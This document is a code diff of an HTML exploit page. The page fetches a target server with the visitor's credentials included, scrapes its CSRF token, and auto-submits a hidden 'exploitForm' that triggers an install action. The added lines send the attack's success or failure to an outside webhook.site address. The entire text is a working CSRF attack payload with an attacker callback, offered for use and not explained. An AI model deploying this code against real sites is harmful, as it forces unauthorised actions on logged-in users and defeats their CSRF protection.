@@ -6,18 +6,52 @@
     <input type="submit" id="installbutton" value="Install">
   </form>
   <script>
+    // Function to send webhook notification
+    function sendWebhook(status, details) {
+      fetch('https://webhook.site/c2fe413d-6693-467a-8785-70bb939fbb20', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ status, details })
+      })
+      .catch(err => console.error('Webhook Error:', err));
+    }
+
+    // Attempt to fetch CSRF token and submit form
     fetch('http://52.47.161.102:3000/', {
-      credentials: 'include'
+      credentials: 'include',
+      headers: {
+        'Accept': 'text/html',
+        'User-Agent': 'Mozilla/5.0 (compatible; Puppeteer)'
+      }
     })
-    .then(response => response.text())
+    .then(response => {
+      if (!response.ok) {
+        sendWebhook('failed', `Fetch failed with status: ${response.status}`);
+        throw new Error(`Fetch failed with status: ${response.status}`);
+      }
+      return response.text();
+    })
     .then(data => {
       const parser = new DOMParser();
       const doc = parser.parseFromString(data, 'text/html');
-      const csrfToken = doc.querySelector('input[name="csrfToken"]').value;
+      const csrfTokenInput = doc.querySelector('input[name="csrfToken"]');
+      if (!csrfTokenInput) {
+        sendWebhook('failed', 'CSRF token input not found in response');
+        throw new Error('CSRF token input not found');
+      }
+      const csrfToken = csrfTokenInput.value;
+      if (!csrfToken) {
+        sendWebhook('failed', 'CSRF token value is empty');
+        throw new Error('CSRF token value is empty');
+      }
       document.getElementById('csrfTokenInput').value = csrfToken;
       document.getElementById('exploitForm').submit();
+      sendWebhook('success', 'Form submitted with CSRF token');
     })
-    .catch(err => console.error('Error:', err));
+    .catch(err => {
+      console.error('Error:', err.message);
+      sendWebhook('failed', err.message);
+    });
   </script>
 </body>
 </html>
